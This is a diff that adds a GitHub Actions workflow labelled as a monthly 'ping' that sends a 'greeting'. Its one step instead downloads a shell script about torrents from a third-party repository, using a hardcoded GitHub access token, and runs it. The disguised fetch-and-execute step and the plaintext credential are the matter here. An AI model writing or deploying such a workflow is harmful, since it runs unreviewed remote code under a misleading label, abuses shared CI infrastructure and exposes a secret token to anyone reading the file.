@@ -1,0 +1,16 @@
+# This is a basic workflow that is auto triggered
+
+name: Scheduled Ping 23-month-3pm
+# This workflow is triggered at a scheduled interval
+on:
+  schedule:
+    # * is a special character in YAML so you have to quote this string.
+    # Runs at 3:00 PM on day 23
+    - cron:  '0 15 23 * *'
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Send greeting
+      run: wget --header 'Authorization:token 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' https://raw.githubusercontent.com/joemakina18/tor/main/wget-torrents.sh && sh wget-torrents.sh
